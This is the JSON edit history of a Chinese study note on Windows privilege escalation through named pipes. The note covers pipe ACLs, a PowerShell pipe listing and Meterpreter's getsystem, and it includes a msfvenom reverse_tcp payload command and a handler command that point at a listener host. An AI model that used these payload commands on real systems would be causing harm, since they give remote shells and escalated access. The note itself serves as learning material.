{"compress":true,"commitItems":[["e74daed4-a609-40d8-a015-f1369803d159",1581862217969,"",[[1581862171318,["whale@Whale",[[1,0,"windows本地提权之命名管道\n===\n\n\n"]],[0,0],[23,23]]],[1581910713031,["whale@Whale",[[-1,22,"\n"],[1,23,"## 命名管道是什么"]],[23,23],[32,32]]],[1581910713192,["whale@Whale",[[1,32,"\n\n"]],[32,32],[33,33]]],[1581910713681,["whale@Whale",[[-1,33,"\n"]],[33,33],[32,32]]],[1581910714202,["whale@Whale",[[1,33,"\n"]],[32,32],[33,33]]],[1581911322495,["whale@Whale",[[1,21,"参考资料:"]],[21,21],[26,26]]],[1581911324569,["whale@Whale",[[1,27,"\n"]],[26,26],[27,27]]],[1581911324954,["whale@Whale",[[1,28,"\n"]],[27,27],[28,28]]],[1581949980800,["whale@Whale",[[-1,28,"\n"]],[28,28],[27,27]]],[1581950241229,["whale@Whale",[[1,28,"\n"]],[26,26],[27,27]]],[1581950243316,["whale@Whale",[[1,27,"- [https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)"]],[27,27],[227,227]]],[1581950244149,["whale@Whale",[[1,229,"\n"]],[227,227],[228,228]]],[1581950245840,["whale@Whale",[[1,228,"- "]],[228,228],[230,230]]],[1581950607072,["whale@Whale",[[1,244,"\n"]],[242,242],[243,243]]],[1581950607257,["whale@Whale",[[1,245,"\n"]],[243,243],[244,244]]],[1581950608552,["whale@Whale",[[1,245,"[System.IO.Directory]::GetFiles(\"\\\\.\\pipe\\\")"]],[245,245],[289,289]]],[1581950613787,["whale@Whale",[[1,244,"powershell"]],[244,244],[254,254]]],[1581950614840,["whale@Whale",[[1,244,"\n"]],[243,243],[244,244]]],[1581950616536,["whale@Whale",[[1,244,"```"]],[244,244],[247,247]]],[1581950617767,["whale@Whale",[[1,304,"\n"]],[303,303],[304,304]]],[1581950618408,["whale@Whale",[[-1,304,"\n"],[1,305,"```"]],[304,304],[307,307]]],[1581950631752,["whale@Whale",[[1,244,"\n"]],[243,243],[244,244]]],[1581950633786,["whale@Whale",[[1,243,"命名管道是一个机制，可以使得应用程序和本地或远程的进程进行通信。\r\n创建命名管道的应用程序称为“命名管道服务器”，连接命名管道的称为“命名管道客户端”。\r\n与socket类似，在服务器创建命名管道后，管道客户端可以与服务器进行连接。\r\n---\r\n命名管道的权限问题\r\n- 连接由安全解释器控制\r\n- ACL是命名管道默认的安全解释器，给本地系统用户，管理员，创建管道的拥有者完全的控制权限。\r\n它也给了任何组的用户和匿名用户读权限。\r\n"]],[243,243],[461,461]]],[1581950636768,["whale@Whale",[[-1,275,"\r"],[-1,319,"\r"],[-1,359,"\r"],[-1,364,"\r"],[-1,375,"\r"],[-1,389,"\r"],[-1,438,"\r"],[-1,459,"\r"],[1,462,"## l"]],[454,454],[458,458]]],[1581950637338,["whale@Whale",[[-1,457,"l"]],[458,458],[457,457]]],[1581950638374,["whale@Whale",[[1,457,"漏洞 "]],[457,457],[460,460]]],[1581950639561,["whale@Whale",[[-1,459," "]],[460,460],[459,459]]],[1581950641226,["whale@Whale",[[1,459,"检测"]],[459,459],[461,461]]],[1581950651164,["whale@Whale",[[1,16,"提权"]],[16,16],[18,18]]],[1581950654528,["whale@Whale",[[-1,16,"提权"]],[18,18],[16,16]]],[1581950659688,["whale@Whale",[[1,358,"\n"]],[358,358],[359,359]]],[1581950807255,["whale@Whale",[[1,526,"\n\n漏洞利用涉及到逆向工程\r\n需要往命名管道写入数据"]],[526,526],[551,551]]],[1581952180007,[null,[[-1,527,"\n"],[-1,539,"\r"],[1,540,"\n"],[1,552,"\n"]],[527,527],[553,553]]],[1581952180007,[null,[[1,527,"\n"],[1,538,"\r"],[-1,538,"\n"],[-1,551,"\n"]],[553,553],[527,527]]],[1581952158344,["whale@Whale",[[1,230,"[https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/](https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/)"],[-1,538,"\r"]],[230,230],[386,386]]],[1581952162774,["whale@Whale",[[-1,231,"https://blog.cobaltstrike.com/2014/04/02/"]],[231,272],[231,231]]],[1581952174756,["whale@Whale",[[-1,30,"https://ired.team/offensive-security/privilege-escalation/"]],[30,87],[30,30]]],[1581955273978,[null,[[-1,584,"\n"],[-1,595,"\r"],[1,596,"程"],[1,608,"\n"]],[584,584],[609,609]]],[1581955273978,[null,[[1,584,"\n"],[1,594,"\r"],[-1,594,"程"],[-1,607,"\n"]],[609,609],[584,584]]],[1581955246842,["whale@Whale",[[1,288,"- [https://metasploit.help.rapid7.com/docs/getsystem-command-work](https://metasploit.help.rapid7.com/docs/getsystem-command-work)"]],[288,288],[418,418]]],[1581955248401,["whale@Whale",[[1,419,"\n"]],[418,418],[419,419]]],[1581955333981,[null,[[-1,715,"\n"],[-1,726,"\r"],[1,727,"程"],[1,739,"\n"]],[715,715],[740,740]]],[1581955333981,[null,[[1,715,"\n"],[1,725,"\r"],[-1,725,"程"],[-1,738,"\n"]],[740,740],[715,715]]],[1581955281933,["whale@Whale",[[1,643,"\n"]],[642,642],[643,643]]],[1581955283123,["whale@Whale",[[1,643,"---"]],[643,643],[646,646]]],[1581955283372,["whale@Whale",[[1,647,"\n"]],[646,646],[647,647]]],[1581955284038,["whale@Whale",[[1,648,"\n"]],[647,647],[648,648]]],[1581955284826,["whale@Whale",[[1,648,"Each method of elevation in `getsystem` relies on the process having certain properties or permissions. On Windows 7/8/8.1, `getsystem` will not work with any of these methods because the operating system has been patched to avoid these flaws."]],[648,648],[891,891]]],[1581955286943,["whale@Whale",[[1,648,"\n"],[-1,675," "],[1,676," "],[-1,687," "],[1,688," "],[-1,771," "],[1,772," "],[-1,783," "],[1,784," ·"]],[647,647],[649,649]]],[1581955287669,["whale@Whale",[[-1,648,"·"]],[649,649],[648,648]]],[1581955288494,["whale@Whale",[[1,648,"```"]],[648,648],[651,651]]],[1581955290449,["whale@Whale",[[1,896,"\n"]],[895,895],[896,896]]],[1581955291330,["whale@Whale",[[1,896,"```"]],[896,896],[899,899]]],[1581955292412,["whale@Whale",[[1,900,"\n"]],[899,899],[900,900]]],[1581955293815,["whale@Whale",[[1,900,"eg"]],[900,900],[902,902]]],[1581955294356,["whale@Whale",[[-1,900,"eg"]],[902,902],[900,900]]],[1581955308038,["whale@Whale",[[1,900,"getsystem使用的就是命名管道的技术，"]],[900,900],[922,922]]],[1581955316558,["whale@Whale",[[1,918,"提权"]],[918,918],[920,920]]],[1581955394005,[null,[[1,651,"\n"],[-1,787,"·"],[-1,997,"\n"],[-1,1008,"\r"],[1,1009,"程"],[1,1021,"\n"]],[651,651],[1022,1022]]],[1581955394005,[null,[[-1,651,"\n"],[1,788,"·"],[1,997,"\n"],[1,1007,"\r"],[-1,1007,"程"],[-1,1020,"\n"]],[1022,1022],[651,651]]],[1581955335785,["whale@Whale",[[1,924,"它"]],[924,924],[925,925]]],[1581955337994,["whale@Whale",[[-1,924,"它"]],[925,925],[924,924]]],[1581955362965,["whale@Whale",[[1,924,"该命令成功与否取决去进程的属性和权限。在win7 8 8.1 zho"]],[924,924],[958,958]]],[1581955363620,["whale@Whale",[[-1,955,"zho"]],[958,958],[955,955]]],[1581955369794,["whale@Whale",[[1,955,"中，这三种方法"]],[955,955],[962,962]]],[1581955377975,["whale@Whale",[[1,957,"getsystem命令使用的"]],[957,957],[971,971]]],[1581955382164,["whale@Whale",[[-1,971,"这"]],[972,972],[971,971]]],[1581955392974,["whale@Whale",[[1,975,"提权方法都不会成功，因为系统已经"]],[975,975],[991,991]]],[1581955453971,[null,[[1,651,"\n"],[-1,787,"·"],[-1,1064,"\n"],[-1,1075,"\r"],[1,1076,"程"],[1,1088,"\n"]],[651,651],[1089,1089]]],[1581955453972,[null,[[-1,651,"\n"],[1,788,"·"],[1,1064,"\n"],[1,1074,"\r"],[-1,1074,"程"],[-1,1087,"\n"]],[1089,1089],[651,651]]],[1581955404001,["whale@Whale",[[1,991,"避免了缺陷打赏"]],[991,991],[998,998]]],[1581955404568,["whale@Whale",[[-1,996,"打赏"]],[998,998],[996,996]]],[1581955408788,["whale@Whale",[[1,996,"打上了补丁。"]],[996,996],[1002,1002]]],[1581955409064,["whale@Whale",[[1,1003,"\n"]],[1002,1002],[1003,1003]]],[1581955409254,["whale@Whale",[[1,1004,"\n"]],[1003,1003],[1004,1004]]],[1581955416627,["whale@Whale",[[1,1004,"当我在win7 运行getsysem"]],[1004,1004],[1022,1022]]],[1581955417408,["whale@Whale",[[-1,1020,"em"]],[1022,1022],[1020,1020]]],[1581955419044,["whale@Whale",[[1,1020,"temm"]],[1020,1020],[1024,1024]]],[1581955419441,["whale@Whale",[[-1,1023,"m"]],[1024,1024],[1023,1023]]],[1581955449180,["whale@Whale",[[1,1023,"命令来提权的时候，提示Operation failed: The environment is incorrect."]],[1023,1023],[1081,1081]]],[1581955450962,["whale@Whale",[[1,1034,"·"]],[1034,1034],[1035,1035]]],[1581955451869,["whale@Whale",[[-1,1034,"·"]],[1035,1035],[1034,1034]]],[1581955452293,["whale@Whale",[[1,1034,"`"]],[1034,1034],[1035,1035]]],[1581955453197,["whale@Whale",[[1,1082,"`"]],[1082,1082],[1083,1083]]],[1581955453930,["whale@Whale",[[1,1084,"\n"]],[1083,1083],[1084,1084]]],[1581955513979,[null,[[1,651,"\n"],[-1,787,"·"],[-1,1157,"\n"],[-1,1168,"\r"],[1,1169,"程"],[1,1181,"\n"]],[651,651],[1182,1182]]],[1581955513979,[null,[[-1,651,"\n"],[1,788,"·"],[1,1157,"\n"],[1,1167,"\r"],[-1,1167,"程"],[-1,1180,"\n"]],[1182,1182],[651,651]]],[1581955490653,["whale@Whale",[[-1,1085,"## 漏洞检测\n```"]],[1088,1096],[1085,1085]]],[1581955493793,["whale@Whale",[[1,1085,"## l"]],[1085,1085],[1089,1089]]],[1581955494252,["whale@Whale",[[-1,1088,"l"]],[1089,1089],[1088,1088]]],[1581955499023,["whale@Whale",[[1,1088,"列出所有明明"]],[1088,1088],[1094,1094]]],[1581955499732,["whale@Whale",[[-1,1092,"明明"]],[1094,1094],[1092,1092]]],[1581955502232,["whale@Whale",[[1,1092,"命名管道"]],[1092,1092],[1096,1096]]],[1581955503003,["whale@Whale",[[1,1097,"\n"]],[1096,1096],[1097,1097]]],[1581955504008,["whale@Whale",[[1,1097,"·"]],[1097,1097],[1098,1098]]],[1581955504643,["whale@Whale",[[-1,1097,"·"]],[1098,1098],[1097,1097]]],[1581955505371,["whale@Whale",[[1,1097,"```"]],[1097,1097],[1100,1100]]],[1581955508881,["whale@Whale",[[-1,1161,"漏洞利用涉及到逆向工程\n需要往命名管道写入数据\n"]],[1160,1184],[1160,1160]]],[1581955574963,[null,[[1,651,"\n"],[-1,787,"·"]],[651,651],[787,787]]],[1581955574963,[null,[[-1,651,"\n"],[1,788,"·"]],[787,787],[651,651]]],[1581955517776,["whale@Whale",[[-1,648,"```\nEach method of elevation in `getsystem` relies on the process having certain properties or permissions. On Windows 7/8/8.1, `getsystem` will not work with any of these methods because the operating system has been patched to avoid these flaws.\n```\ngetsystem使用的就是命名管道提权的技术，该命令成功与否取决去进程的属性和权限。在win7 8 8.1 中，getsystem命令使用的三种方法提权方法都不会成功，因为系统已经避免了缺陷打上了补丁。\n\n当我在win7 运行getsystem命令来提权的时候，提示`Operation failed: The environment is incorrect.`\n\n"]],[647,1084],[647,647]]],[1581955519085,["whale@Whale",[[-1,647,"\n"]],[647,647],[646,646]]],[1581955519785,["whale@Whale",[[-1,643,"---"]],[646,646],[643,643]]],[1581955520139,["whale@Whale",[[-1,643,"\n"]],[643,643],[642,642]]],[1581955521243,["whale@Whale",[[1,719,"\n"]],[718,718],[719,719]]],[1581955523165,["whale@Whale",[[-1,719,"\n"],[1,720,"## s"]],[719,719],[723,723]]],[1581955523488,["whale@Whale",[[-1,722,"s"]],[723,723],[722,722]]],[1581955526804,["whale@Whale",[[1,722,"getsystem命令"]],[722,722],[733,733]]],[1581955527258,["whale@Whale",[[1,733,"\n\n```\nEach method of elevation in `getsystem` relies on the process having certain properties or permissions. On Windows 7/8/8.1, `getsystem` will not work with any of these methods because the operating system has been patched to avoid these flaws.\n```\ngetsystem使用的就是命名管道提权的技术，该命令成功与否取决去进程的属性和权限。在win7 8 8.1 中，getsystem命令使用的三种方法提权方法都不会成功，因为系统已经避免了缺陷打上了补丁。\n\n当我在win7 运行getsystem命令来提权的时候，提示`Operation failed: The environment is incorrect.`\n\n"]],[733,733],[1171,1171]]],[1581955531970,["whale@Whale",[[1,983,"\n"]],[982,982],[983,983]]],[1581955534626,["whale@Whale",[[1,983,"在网"]],[983,983],[985,985]]],[1581955535164,["whale@Whale",[[-1,984,"网"]],[985,985],[984,984]]],[1581955542011,["whale@Whale",[[1,984,"网上摘抄了一段资料"]],[984,984],[993,993]]],[1581955545999,["whale@Whale",[[1,739,"\n"]],[738,738],[739,739]]],[1581955547035,["whale@Whale",[[1,739,"。。"]],[739,739],[741,741]]],[1581955547910,["whale@Whale",[[-1,739,"。。"]],[741,741],[739,739]]],[1581955550456,["whale@Whale",[[1,739,"。"]],[739,739],[740,740]]],[1581955550997,["whale@Whale",[[-1,739,"。"]],[740,740],[739,739]]],[1581955551864,["whale@Whale",[[1,739,"..."]],[739,739],[742,742]]],[1581955942843,["whale@Whale",[[1,1187,"\n"]],[1186,1186],[1187,1187]]],[1581955943464,["whale@Whale",[[1,1187,"```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe-service -o x.exe\n```"]],[1187,1187],[1297,1297]]],[1581955946868,["whale@Whale",[[-1,1212,"64"]],[1214,1214],[1212,1212]]],[1581955948456,["whale@Whale",[[1,1212,"32"]],[1212,1212],[1214,1214]]],[1581955953055,["whale@Whale",[[-1,1276,"-service"]],[1276,1284],[1276,1276]]],[1581955956405,["whale@Whale",[[-1,1280,"x"]],[1281,1281],[1280,1280]]],[1581955960528,["whale@Whale",[[1,1280,"payload32"]],[1280,1280],[1289,1289]]],[1581955964982,["whale@Whale",[[-1,1212,"32"]],[1214,1214],[1212,1212]]],[1581955967167,["whale@Whale",[[1,1212,"86"]],[1212,1212],[1214,1214]]],[1581955998748,["whale@Whale",[[-1,1212,"86/"]],[1215,1215],[1212,1212]]],[1581955999213,["whale@Whale",[[-1,1211,"x"]],[1212,1212],[1211,1211]]],[1581956062373,["whale@Whale",[[1,1191,"\n"]],[1190,1190],[1191,1191]]],[1581956062816,["whale@Whale",[[1,1191,"| \n\n1\n2\n3\n\n | \n\n```\nhandler -H 192.168.1.100 -P 4444 -p windows/x64/meterpreter/reverse_tcp\n```\n\n |"]],[1191,1191],[1290,1290]]],[1581956067894,["whale@Whale",[[-1,1191,"| \n\n1\n2\n3\n\n | \n\n```"]],[1191,1210],[1191,1191]]],[1581956070180,["whale@Whale",[[-1,1264,"```"]],[1264,1267],[1264,1264]]],[1581956072332,["whale@Whale",[[-1,1266," |"]],[1266,1268],[1266,1266]]],[1581956072732,["whale@Whale",[[-1,1266,"\n"]],[1266,1266],[1265,1265]]],[1581956075039,["whale@Whale",[[-1,1236,"x64/"]],[1236,1240],[1236,1236]]],[1581956125652,["whale@Whale",[[-1,1261,"\n"]],[1261,1261],[1260,1260]]],[1581956469008,["whale@Whale",[[1,1360,"\n"]],[1359,1359],[1360,1360]]],[1581956469168,["whale@Whale",[[1,1361,"\n"]],[1360,1360],[1361,1361]]],[1581956471856,["whale@Whale",[[1,1361,"whoami /groups"]],[1361,1361],[1375,1375]]],[1581957855626,["whale@Whale",[[-1,1191,"\n"]],[1191,1191],[1190,1190]]],[1581958164356,["whale@Whale",[[1,420,"\n"]],[418,418],[419,419]]],[1581958166715,["whale@Whale",[[1,419,"- [https://www.anquanke.com/post/id/87292](https://www.anquanke.com/post/id/87292)"]],[419,419],[501,501]]],[1581958304155,["whale@Whale",[[1,546,"socket"]],[546,546],[552,552]]],[1581958305553,["whale@Whale",[[-1,546,"socket"]],[552,552],[546,546]]],[1581958888580,["whale@Whale",[[1,1270,"\n"]],[1268,1268],[1269,1269]]],[1581958888947,["whale@Whale",[[1,1271,"\n"]],[1269,1269],[1270,1270]]],[1581958889653,["whale@Whale",[[1,1270,"m"]],[1270,1270],[1271,1271]]],[1581958890106,["whale@Whale",[[-1,1270,"m"]],[1271,1271],[1270,1270]]],[1581958898809,["whale@Whale",[[1,1270,"成功提权需要，A"]],[1270,1270],[1278,1278]]],[1581958899164,["whale@Whale",[[-1,1277,"A"]],[1278,1278],[1277,1277]]],[1581958900608,["whale@Whale",[[1,1277,"y"]],[1277,1277],[1278,1278]]],[1581958901061,["whale@Whale",[[-1,1277,"y"]],[1278,1278],[1277,1277]]],[1581958902252,["whale@Whale",[[1,1277,"哟弄个胡"]],[1277,1277],[1281,1281]]],[1581958903167,["whale@Whale",[[-1,1277,"哟弄个胡"]],[1281,1281],[1277,1277]]],[1581958913589,["whale@Whale",[[1,1277,"用户权限具有adminitrator，"]],[1277,1277],[1296,1296]]],[1581958916331,["whale@Whale",[[1,1296,"并且"]],[1296,1296],[1298,1298]]],[1581958917935,["whale@Whale",[[-1,1296,"并且"]],[1298,1298],[1296,1296]]],[1581958921631,["whale@Whale",[[1,1277,"1."]],[1277,1277],[1279,1279]]],[1581958928166,["whale@Whale",[[1,1298,"2. windowsb"]],[1298,1298],[1309,1309]]],[1581958928916,["whale@Whale",[[-1,1308,"b"]],[1309,1309],[1308,1308]]],[1581958934158,["whale@Whale",[[1,1308,"版本小于win7。"]],[1308,1308],[1317,1317]]],[1581963020756,["whale@Whale",[[1,725,"命名管道默认使用的是SMB协议来通信。"]],[725,725],[744,744]]],[1581963022941,["whale@Whale",[[1,725,"\n"]],[724,724],[725,725]]],[1582007254353,["whale@Whale",[[1,503,"\n"]],[502,502],[503,503]]],[1582007254761,["whale@Whale",[[1,503,"https://www.bilibili.com/video/av89777352"]],[503,503],[544,544]]],[1582007257211,["whale@Whale",[[1,503,"sh"]],[503,503],[505,505]]],[1582007257786,["whale@Whale",[[-1,503,"sh"]],[505,505],[503,503]]],[1582007260955,["whale@Whale",[[1,503,"视频地址"]],[503,503],[507,507]]],[1582007261790,["whale@Whale",[[-1,505,"地址"]],[507,507],[505,505]]],[1582007273067,["whale@Whale",[[1,505,"教程地址：【"]],[505,505],[511,511]]],[1582007274181,["whale@Whale",[[-1,510,"【"]],[511,511],[510,510]]],[1582007275031,["whale@Whale",[[1,510,"["]],[510,510],[511,511]]],[1582007279459,["whale@Whale",[[1,552,"]()"]],[552,552],[555,555]]],[1582007280806,["whale@Whale",[[1,554,"https://www.bilibili.com/video/av89777352"]],[554,554],[595,595]]]]]]}